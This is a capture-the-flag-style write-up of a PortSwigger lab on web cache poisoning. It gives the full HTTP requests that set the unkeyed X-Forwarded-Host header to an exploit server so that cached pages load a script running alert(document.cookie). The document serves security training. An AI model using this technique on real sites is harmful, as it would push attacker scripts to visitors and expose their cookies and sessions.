
# #PortSwigger 


![[Pasted image 20260613214559.png]]


## Lab Description
> This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

---
---

## Step 1: Understanding the Vulnerability

**Web cache poisoning** occurs when an attacker injects malicious content into a cached response that is then served to other users.

**In this lab:**
- The `X-Forwarded-Host` header is **unkeyed** (not part of the cache key)
- The application uses this header to generate an absolute URL for a JavaScript file
- By poisoning the cache with a malicious `X-Forwarded-Host` value, all users receive a malicious script

**The attack chain:**
1. Attacker sends request with `X-Forwarded-Host: attacker.com`
2. Cache stores response with attacker's domain in script URL
3. Victim requests home page -> receives poisoned response
4. Victim's browser loads malicious script -> `alert(document.cookie)`

---

## Step 2: Reconnaissance

### Step 2.1: Load the Home Page

Open the lab's home page in your browser.

### Step 2.2: Find the Vulnerable Request

In Burp Proxy -> **HTTP history**, find the `GET /` request.

Send it to **Repeater**.

![[Pasted image 20260613223634.png]]


---

## Step 3: Testing the Vulnerability

### Step 3.1: Add a Cache Buster

Add a unique query parameter to bypass cache while testing:
```
GET /?cb=1234 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

### Step 3.2: Add X-Forwarded-Host Header

```
GET /?cb=1234 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Forwarded-Host: example.com
```

**Observe the response:** Look for a script tag with `src="https://example.com/resources/js/tracking.js"`

![[Pasted image 20260613223959.png]]

The `X-Forwarded-Host` header is reflected in the response


----

## Step 4: Creating the Malicious Script

### Step 4.1: On the Exploit Server

1. Go to the **Exploit server**
2. Create a file at the exact path: `/resources/js/tracking.js`
![[Pasted image 20260613224321.png]]

3. Set the **Body** to:
```
alert(document.cookie)
```

![[Pasted image 20260613224333.png]]

4. Click **Store**

Note your exploit server URL: `https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net`

---

## Step 5: Poisoning the Cache

### Step 5.1: Remove the Cache Buster

```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

![[Pasted image 20260613224732.png]]
### Step 5.2: Send the Request Repeatedly

Keep sending the request until you see:      
- `X-Cache: hit` in the response headers
- Your exploit server URL in the script tag

![[Pasted image 20260613224843.png]]

### Step 5.3: Verify the Poisoned Cache

In your browser, visit the home page (no cache buster).

![[Pasted image 20260613230411.png]]

**Expected result:** `alert(document.cookie)` popup appears

---

## Step 6: Keeping the Cache Poisoned

The cache expires every **30 seconds**. You need to continuously re-poison the cache.

**Option 1:** Keep sending the request in Burp Repeater every few seconds

**Option 2:** Use Burp Intruder with a null payload to send requests continuously
![[Pasted image 20260613230500.png]]


---

## Step 7: Lab Solved

Once the victim visits the poisoned home page, the lab solves automatically.

Success message displayed:

![[Pasted image 20260613230525.png]]

---
---
